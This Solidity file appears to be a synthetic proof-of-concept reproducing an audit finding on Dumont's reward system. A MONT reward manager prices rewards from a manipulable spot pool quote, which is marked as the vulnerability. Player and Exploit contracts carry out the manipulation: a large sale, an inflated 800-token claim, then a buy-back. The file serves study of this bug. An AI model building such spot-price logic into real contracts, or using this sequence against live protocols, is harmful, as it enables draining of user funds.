// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Dumont — spot MONT price inflates rewards (Pashov H-02)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: getMontPrice uses quoteExactInputSingle on the current pool,
    and transferPlayerRewards does reward = ((houseFee * 1e18 * 8) / 10) / price.
    Selling 9000 MONT moves the spot quote from 1e6 to 1e4. A 10 USDT house fee
    then pays 800 MONT instead of 8. The seller buys the MONT back and keeps
    the extra rewards. */

contract Erc20 {
    string public symbol;
    uint8 public immutable decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory symbol_, uint8 decimals_) {
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SpotPool {
    Erc20 public mont;
    Erc20 public usdt;
    uint256 public montReserve;
    uint256 public usdtReserve;

    constructor(Erc20 mont_, Erc20 usdt_) {
        mont = mont_;
        usdt = usdt_;
        montReserve = 1000 ether;
        usdtReserve = 1000e6;
    }

    function quoteExactInputSingle(address, address, uint24, uint256 amountIn, uint160) external view returns (uint256 price) {
        price = usdtReserve * amountIn / montReserve; // @> VULN: this is the spot reserve quote, not a TWAP
        // FIX: read a TWAP or oracle instead of usdtReserve / montReserve
    }

    function sellMont(uint256 montIn) external returns (uint256 usdtOut) {
        usdtOut = usdtReserve * montIn / (montReserve + montIn);
        montReserve += montIn;
        usdtReserve -= usdtOut;
        mont.transferFrom(msg.sender, address(this), montIn);
        usdt.transfer(msg.sender, usdtOut);
    }

    function buyMont(uint256 usdtIn) external returns (uint256 montOut) {
        montOut = montReserve * usdtIn / (usdtReserve + usdtIn);
        usdtReserve += usdtIn;
        montReserve -= montOut;
        usdt.transferFrom(msg.sender, address(this), usdtIn);
        mont.transfer(msg.sender, montOut);
    }
}

contract MontRewardManager {
    Erc20 public mont;
    SpotPool public pool;
    mapping(address => uint256) public balances;
    uint256 public lastReward;

    constructor(Erc20 mont_, SpotPool pool_) {
        mont = mont_;
        pool = pool_;
    }

    function transferPlayerRewards(address player, uint256 houseFee) external returns (uint256 reward) {
        uint256 price = pool.quoteExactInputSingle(address(mont), address(0), 3000, 1 ether, 0);
        uint256 houseFeeFixedPoint = houseFee * 1e18;
        reward = ((houseFeeFixedPoint * 8) / 10) / price;
        balances[player] += reward;
        lastReward = reward;
    }

    function claim(address player) external {
        uint256 amount = balances[player];
        balances[player] = 0;
        mont.transfer(player, amount);
    }
}

contract Player {
    function attack(SpotPool pool, MontRewardManager mgr, Erc20 mont, Erc20 usdt) external {
        mont.approve(address(pool), type(uint256).max);
        usdt.approve(address(pool), type(uint256).max);
        pool.sellMont(9000 ether);
        mgr.transferPlayerRewards(address(this), 10e6);
        mgr.claim(address(this));
        pool.buyMont(900e6);
    }
}

contract Exploit {
    Erc20 public mont; // CREATE nonce 1
    Erc20 public usdt; // CREATE nonce 2
    SpotPool public pool; // CREATE nonce 3
    MontRewardManager public mgr; // CREATE nonce 4
    Player public player; // CREATE nonce 5

    constructor() {
        mont = new Erc20("MONT", 18);
        usdt = new Erc20("USDT", 6);
        pool = new SpotPool(mont, usdt);
        mgr = new MontRewardManager(mont, pool);
        player = new Player();
        mont.mint(address(pool), 1000 ether);
        usdt.mint(address(pool), 1000e6);
        mont.mint(address(player), 9000 ether);
        mont.mint(address(mgr), 800 ether);
    }

    function run() external {
        player.attack(pool, mgr, mont, usdt);
        require(pool.quoteExactInputSingle(address(mont), address(0), 3000, 1 ether, 0) == 1e6, "price not restored");
        require(mgr.lastReward() == 800 ether, "inflated reward");
        require(mont.balanceOf(address(player)) == 9800 ether, "player profit");
    }
}
